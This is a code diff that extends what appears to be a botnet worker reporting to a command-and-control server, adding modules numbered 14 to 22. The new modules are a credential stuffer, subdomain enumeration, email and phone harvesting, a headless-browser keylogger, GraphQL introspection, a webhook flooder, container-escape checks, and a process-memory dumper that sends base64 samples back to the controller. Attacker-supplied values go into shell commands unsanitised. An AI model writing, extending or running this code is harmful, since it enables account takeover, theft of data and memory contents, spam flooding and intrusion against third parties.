@@ -26,7 +26,7 @@ function connect() {
     }
 
     ws.on('open', () => { 
-            logToC2("✅ UNIT ONLINE: VERSION 5.0 (STUDIO READY)"); 
+            logToC2("✅ UNIT ONLINE: VERSION 6.0 (FULL SUITE)"); 
         ws.send(JSON.stringify({ type: 'REGISTER_WORKER' })); 
     });
 
@@ -294,6 +294,185 @@ function connect() {
                                 }
                             }
                         });
+                    });
+                });
+            }
+            // 14. CREDENTIAL STUFFER
+            else if (msg.type === 'STUFF_CMD') {
+                logToC2(`[STUFFER] Targeting: ${msg.targetUrl} with ${msg.username}:*****`);
+                const passwords = ['123456', 'password', 'admin123', 'welcome1', 'qwerty'];
+                (async () => {
+                    for (const pass of passwords) {
+                        try {
+                            const res = await fetch(msg.targetUrl, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ username: msg.username, password: pass })
+                            });
+                            if (res.status !== 401) {
+                                ws.send(JSON.stringify({ 
+                                    type: 'STUFF_RESULT', 
+                                    combo: `${msg.username}:${pass}`, 
+                                    status: res.status 
+                                }));
+                                break;
+                            }
+                        } catch(e) {}
+                    }
+                    logToC2(`[STUFFER] Brute cycle complete.`);
+                })();
+            }
+            // 15. DNS ENUMERATOR
+            else if (msg.type === 'DNS_ENUM') {
+                logToC2(`[DNS] Enumerating: ${msg.domain}`);
+                const subdomains = ['mail', 'webmail', 'admin', 'portal', 'api', 'dev', 'test'];
+                subdomains.forEach(sub => {
+                    exec(`dig ${sub}.${msg.domain} +short`, (err, stdout) => {
+                        if (stdout.trim()) {
+                            ws.send(JSON.stringify({ 
+                                type: 'DNS_RESULT', 
+                                subdomain: `${sub}.${msg.domain}`, 
+                                ip: stdout.split('\n')[0] 
+                            }));
+                        }
+                    });
+                });
+            }
+            // 16. DATA PARSER (Email/Phone Harvest)
+            else if (msg.type === 'PARSE_CMD') {
+                logToC2(`[PARSER] Harvesting from: ${msg.url}`);
+                fetch(msg.url)
+                    .then(async res => {
+                        const html = await res.text();
+                        const emails = html.match(/[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g) || [];
+                        const phones = html.match(/[\+]?[(]?[0-9]{1,4}[)]?[-\s\.]?[0-9]{3}[-\s\.]?[0-9]{4,6}/g) || [];
+                        ws.send(JSON.stringify({ 
+                            type: 'PARSE_RESULT', 
+                            emails: [...new Set(emails)].slice(0,50), 
+                            phones: [...new Set(phones)].slice(0,50) 
+                        }));
+                    })
+                    .catch(err => logToC2(`[PARSER ERROR] ${err.message}`));
+            }
+            // 17. HEADLESS BROWSER KEYLOGGER SIM
+            else if (msg.type === 'KEYLOG_CMD') {
+                logToC2(`[KEYLOG] Deploying to: ${msg.url}`);
+                const script = `
+    const puppeteer=require('puppeteer');
+    (async()=>{
+        const browser=await puppeteer.launch({args:['--no-sandbox']});
+        const page=await browser.newPage();
+        await page.goto('${msg.url}');
+        await page.exposeFunction('sendKey', async(key)=>{
+            console.log('KEY:'+key);
+        });
+        await page.evaluate(()=>{
+            document.addEventListener('keydown',e=>window.sendKey(e.key));
+        });
+        setTimeout(()=>{ browser.close(); },30000);
+    })();`;
+                fs.writeFileSync('keylogger.js', script);
+                exec('node keylogger.js 2>&1 | grep KEY:', {timeout:35000}, (e,o) => {
+                    if(o) ws.send(JSON.stringify({type:'KEYLOG_RESULT',keys:o.split('\n').slice(0,100)}));
+                });
+            }
+            // 18. GRAPHQL INTROSPECTION
+            else if (msg.type === 'GRAPHQL_PROBE') {
+                logToC2(`[GRAPHQL] Probing: ${msg.endpoint}`);
+                const introspectionQuery = JSON.stringify({
+                    query: `{__schema{types{name fields{name type{name}}}}}` 
+                });
+                fetch(msg.endpoint, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: introspectionQuery
+                })
+                .then(async res => {
+                    const data = await res.json();
+                    if(data.data) {
+                        ws.send(JSON.stringify({ 
+                            type: 'GRAPHQL_RESULT', 
+                            schema: JSON.stringify(data.data).substring(0,2000) 
+                        }));
+                    }
+                })
+                .catch(err => logToC2(`[GRAPHQL ERROR] ${err.message}`));
+            }
+            // 19. WEBHOOK SPAMMER
+            else if (msg.type === 'WEBHOOK_SPAM') {
+                logToC2(`[WEBHOOK] Flooding: ${msg.webhookUrl}`);
+                const payload = msg.payload || {content:"@everyone ALERT"};
+                let sent = 0;
+                const interval = setInterval(() => {
+                    if(sent >= (msg.count || 50)) {
+                        clearInterval(interval);
+                        return;
+                    }
+                    fetch(msg.webhookUrl, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    }).then(() => sent++).catch(() => {});
+                }, 1000);
+                setTimeout(() => {
+                    clearInterval(interval);
+                    ws.send(JSON.stringify({type:'WEBHOOK_RESULT', sent: sent}));
+                }, 60000);
+            }
+            // 20. CONTAINER ESCAPE DETECTOR
+            else if (msg.type === 'ESCAPE_DETECT') {
+                logToC2(`[ESCAPE] Testing container boundaries...`);
+                const checks = {
+                    dockerSock: fs.existsSync('/var/run/docker.sock'),
+                    procMount: fs.existsSync('/proc/1/cgroup') && 
+                        fs.readFileSync('/proc/1/cgroup', 'utf8').includes('docker'),
+                    capabilities: ''
+                };
+                exec('capsh --print', (err, stdout) => {
+                    checks.capabilities = stdout.substring(0,200);
+                    ws.send(JSON.stringify({ 
+                        type: 'ESCAPE_RESULT', 
+                        dockerSocket: checks.dockerSock,
+                        inContainer: checks.procMount,
+                        caps: checks.capabilities 
+                    }));
+                });
+            }
+            // 21. SATELLITE IMAGERY FETCHER
+            else if (msg.type === 'SATELLITE_CMD') {
+                const { lat, lon, zoom } = msg;
+                logToC2(`[SAT] Fetching coordinates: ${lat},${lon}`);
+                const url = `https://maps.googleapis.com/maps/api/staticmap?center=${lat},${lon}&zoom=${zoom||13}&size=600x400&maptype=satellite&key=${process.env.GMAPS_KEY}`;
+                fetch(url)
+                    .then(async res => {
+                        const buffer = await res.arrayBuffer();
+                        const b64 = Buffer.from(buffer).toString('base64');
+                        ws.send(JSON.stringify({ 
+                            type: 'SATELLITE_RESULT', 
+                            image: b64,
+                            coords: `${lat},${lon}` 
+                        }));
+                    })
+                    .catch(err => logToC2(`[SAT ERROR] ${err.message}`));
+            }
+            // 22. MEMORY SCRAPER (PROC DUMP)
+            else if (msg.type === 'MEMDUMP_CMD') {
+                logToC2(`[MEMDUMP] Targeting PID: ${msg.pid || 'self'}`);
+                const pid = msg.pid || process.pid;
+                exec(`cat /proc/${pid}/maps | grep rw-p | awk '{print $1}'`, (err, stdout) => {
+                    const ranges = stdout.split('\n').filter(r => r).slice(0,3);
+                    ranges.forEach(range => {
+                        const [start,end] = range.split('-').map(x => parseInt(x,16));
+                        exec(`dd if=/proc/${pid}/mem bs=1 skip=${start} count=${end-start} 2>/dev/null | base64`, 
+                            (e,o) => {
+                                if(o.length > 100) {
+                                    ws.send(JSON.stringify({ 
+                                        type: 'MEMDUMP_RESULT', 
+                                        range: range, 
+                                        sample: o.substring(0,5000) 
+                                    }));
+                                }
+                            });
                     });
                 });
             }
